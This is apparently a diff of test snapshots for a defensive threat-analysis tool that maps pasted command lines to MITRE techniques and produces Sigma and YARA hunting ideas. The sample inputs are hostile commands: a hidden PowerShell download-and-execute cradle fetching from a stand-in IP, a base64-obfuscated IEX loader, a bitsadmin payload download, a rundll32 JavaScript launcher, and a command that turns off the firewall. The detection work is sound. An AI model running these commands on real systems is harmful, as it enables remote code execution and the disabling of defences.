           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell), `T1059.003` (Windows Command Shell), `T1047` (T1047). During **Defense Evasion** the analyst observed `T1564.003` (Hide Artifacts: Hidden Window). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -4789,26 +5014,63 @@
                   "title": "Stage 1 \u2014 wmic \u00b7 /node:\"WORKSTATION-04\" process call create \"cmd.exe /c power"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "3 technique(s) observed (T1059.001, T1059.003, T1047). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1564.003). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 6 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (3 tech.), **Defense Evasion** (1 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 45,
+                "confidence": "High",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
+                "[T1059.003] Baseline legitimate `cmd.exe` invocations from LOB apps; alert on cmd.exe child processes spawned by Office / browser / Outlook.",
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
+                "Sigma: parent_image ends_with (`winword.exe`, `excel.exe`, `outlook.exe`, `acrord32.exe`, `chrome.exe`) AND child_image ends_with `cmd.exe`",
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
+                "YARA: string \"cmd.exe /c\" combined with office suite parent process",
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 109.8,
+          "elapsed_ms": 108.2,
           "status": 200
         },
         "upload": {
@@ -4836,7 +5098,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 132.7,
+          "elapsed_ms": 131.1,
           "status": 200
         }
       }
@@ -4958,7 +5220,7 @@
               }
             ]
           },
-          "elapsed_ms": 175.2,
+          "elapsed_ms": 228.4,
           "status": 200
         },
         "die": {
@@ -4975,7 +5237,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 107.3,
+          "elapsed_ms": 105.8,
           "status": 200
         },
         "narrate": {
@@ -4990,7 +5252,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 102.1,
+          "elapsed_ms": 101.3,
           "status": 200
         },
         "upload": {
@@ -5018,7 +5280,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 108.6,
+          "elapsed_ms": 143.7,
           "status": 200
         }
       },
@@ -5062,7 +5324,7 @@
               }
             ]
           },
-          "elapsed_ms": 169.7,
+          "elapsed_ms": 153.4,
           "status": 200
         },
         "die": {
@@ -5079,7 +5341,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 103.2,
+          "elapsed_ms": 104.7,
           "status": 200
         },
         "narrate": {
@@ -5094,7 +5356,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.0,
+          "elapsed_ms": 97.2,
           "status": 200
         },
         "upload": {
@@ -5122,7 +5384,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 119.5,
+          "elapsed_ms": 107.8,
           "status": 200
         }
       }
@@ -5268,7 +5530,7 @@
               }
             ]
           },
-          "elapsed_ms": 153.5,
+          "elapsed_ms": 174.2,
           "status": 200
         },
         "die": {
@@ -5348,7 +5610,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 111.5,
+          "elapsed_ms": 121.1,
           "status": 200
         },
         "narrate": {
@@ -5363,7 +5625,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 101.9,
+          "elapsed_ms": 98.5,
           "status": 200
         },
         "upload": {
@@ -5391,7 +5653,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 104.8,
+          "elapsed_ms": 100.7,
           "status": 200
         }
       },
@@ -5451,7 +5713,7 @@
               }
             ]
           },
-          "elapsed_ms": 162.8,
+          "elapsed_ms": 150.4,
           "status": 200
         },
         "die": {
@@ -5531,7 +5793,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 94.6,
+          "elapsed_ms": 125.6,
           "status": 200
         },
         "narrate": {
@@ -5546,7 +5808,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 98.0,
+          "elapsed_ms": 97.2,
           "status": 200
         },
         "upload": {
@@ -5574,7 +5836,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 108.1,
+          "elapsed_ms": 100.1,
           "status": 200
         }
       }
@@ -5784,7 +6046,7 @@
               }
             ]
           },
-          "elapsed_ms": 167.7,
+          "elapsed_ms": 154.5,
           "status": 200
         },
         "die": {
@@ -6050,13 +6312,13 @@
               ]
             }
           },
-          "elapsed_ms": 109.3,
+          "elapsed_ms": 104.8,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -6070,26 +6332,52 @@
                   "title": "Stage 1 \u2014 powershell \u00b7 -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetStri"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1059.001). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "2 technique(s) observed (T1027, T1564.003). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 3 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (2 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
+                "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution."
+              ],
+              "sigma_hunts": [
+                "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
+                "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
+                "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\""
+              ]
             }
           },
-          "elapsed_ms": 97.5,
+          "elapsed_ms": 145.6,
           "status": 200
         },
         "upload": {
@@ -6117,7 +6405,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 104.0,
+          "elapsed_ms": 101.5,
           "status": 200
         }
       },
@@ -6205,7 +6493,7 @@
               }
             ]
           },
-          "elapsed_ms": 168.6,
+          "elapsed_ms": 158.3,
           "status": 200
         },
         "die": {
@@ -6471,13 +6759,13 @@
               ]
             }
           },
-          "elapsed_ms": 99.1,
+          "elapsed_ms": 110.4,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -6491,26 +6779,52 @@
                   "title": "Stage 1 \u2014 powershell \u00b7 -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetStri"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1059.001). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "2 technique(s) observed (T1027, T1564.003). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 3 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (2 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
+                "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution."
+              ],
+              "sigma_hunts": [
+                "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
+                "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
+                "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\""
+              ]
             }
           },
-          "elapsed_ms": 144.0,
+          "elapsed_ms": 135.7,
           "status": 200
         },
         "upload": {
@@ -6538,7 +6852,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 120.1,
+          "elapsed_ms": 192.7,
           "status": 200
         }
       }
@@ -6643,7 +6957,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 144.0,
+          "elapsed_ms": 153.9,
           "status": 200
         },
         "die": {
@@ -6660,7 +6974,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 102.2,
+          "elapsed_ms": 99.0,
           "status": 200
         },
         "narrate": {
@@ -6675,7 +6989,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 93.8,
+          "elapsed_ms": 103.6,
           "status": 200
         },
         "upload": {
@@ -6701,7 +7015,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 104.6,
+          "elapsed_ms": 101.7,
           "status": 200
         }
       },
@@ -6732,7 +7046,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 209.1,
+          "elapsed_ms": 151.3,
           "status": 200
         },
         "die": {
@@ -6749,7 +7063,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 103.4,
+          "elapsed_ms": 96.7,
           "status": 200
         },
         "narrate": {
@@ -6764,7 +7078,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 101.0,
+          "elapsed_ms": 95.8,
           "status": 200
         },
         "upload": {
@@ -6790,7 +7104,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 106.3,
+          "elapsed_ms": 109.2,
           "status": 200
         }
       }
@@ -6869,7 +7183,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 127.1,
+          "elapsed_ms": 94.1,
           "status": 200
         },
         "narrate": {
@@ -6899,7 +7213,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 106.3,
+          "elapsed_ms": 103.8,
           "status": 200
         }
       },
@@ -6922,7 +7236,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 112.2,
+          "elapsed_ms": 95.9,
           "status": 200
         },
         "narrate": {
@@ -6952,7 +7266,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 118.9,
+          "elapsed_ms": 140.1,
           "status": 200
         }
       }
@@ -7146,7 +7460,7 @@
               }
             ]
           },
-          "elapsed_ms": 879.2,
+          "elapsed_ms": 1306.4,
           "status": 200
         },
         "die": {
@@ -7364,13 +7678,13 @@
               ]
             }
           },
-          "elapsed_ms": 102.1,
+          "elapsed_ms": 101.9,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1197` (T1197). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -7384,26 +7698,47 @@
                   "title": "Stage 1 \u2014 bitsadmin \u00b7 /transfer job1 /priority foreground http://198.51.100.42/m.e"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1197). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 2 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Defense Evasion** (1 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 100.8,
+          "elapsed_ms": 104.1,
           "status": 200
         },
         "upload": {
@@ -7431,7 +7766,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 108.7,
+          "elapsed_ms": 118.9,
           "status": 200
         }
       },
@@ -7505,7 +7840,7 @@
               }
             ]
           },
-          "elapsed_ms": 1082.4,
+          "elapsed_ms": 2197.9,
           "status": 200
         },
         "die": {
@@ -7723,13 +8058,13 @@
               ]
             }
           },
-          "elapsed_ms": 111.3,
+          "elapsed_ms": 97.9,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1197` (T1197). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -7743,26 +8078,47 @@
                   "title": "Stage 1 \u2014 bitsadmin \u00b7 /transfer job1 /priority foreground http://198.51.100.42/m.e"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1197). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 2 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Defense Evasion** (1 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 97.7,
+          "elapsed_ms": 97.8,
           "status": 200
         },
         "upload": {
@@ -7790,7 +8146,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 109.7,
+          "elapsed_ms": 120.4,
           "status": 200
         }
       }
@@ -7981,7 +8337,7 @@
               }
             ]
           },
-          "elapsed_ms": 163.2,
+          "elapsed_ms": 152.6,
           "status": 200
         },
         "die": {
@@ -8416,22 +8772,65 @@
               ]
             }
           },
-          "elapsed_ms": 98.0,
+          "elapsed_ms": 95.2,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
-              "executive_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.007` (JavaScript). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1218.011` (Rundll32). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1059.007). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "2 technique(s) observed (T1027, T1218.011). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 4 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (1 tech.), **Defense Evasion** (2 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "likely_objective": [
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
+              ],
               "mitre_matrix": [],
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "overall_assessment": {
+                "attack_progress_pct": 45,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
+              },
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
+                "[T1218.011] Baseline signed-DLL entrypoints commonly invoked via rundll32; alert on rundll32.exe loading DLLs from `%TEMP%`, `%APPDATA%`, or a UNC path.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations."
+              ],
+              "sigma_hunts": [
+                "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
+                "Sigma: process rundll32.exe with DLL argument in (%TEMP%, %APPDATA%, \\\\\\\\*)",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
+                "YARA: regex /rundll32.exe\\s+(%TEMP%|%APPDATA%|\\\\\\\\[^\\s,]+),/i",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 95.8,
+          "elapsed_ms": 97.9,
           "status": 200
         },
         "upload": {
@@ -8459,7 +8858,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 167.1,
+          "elapsed_ms": 101.2,
           "status": 200
         }
       },
@@ -8534,7 +8933,7 @@
               }
             ]
           },
-          "elapsed_ms": 164.6,
+          "elapsed_ms": 155.2,
           "status": 200
         },
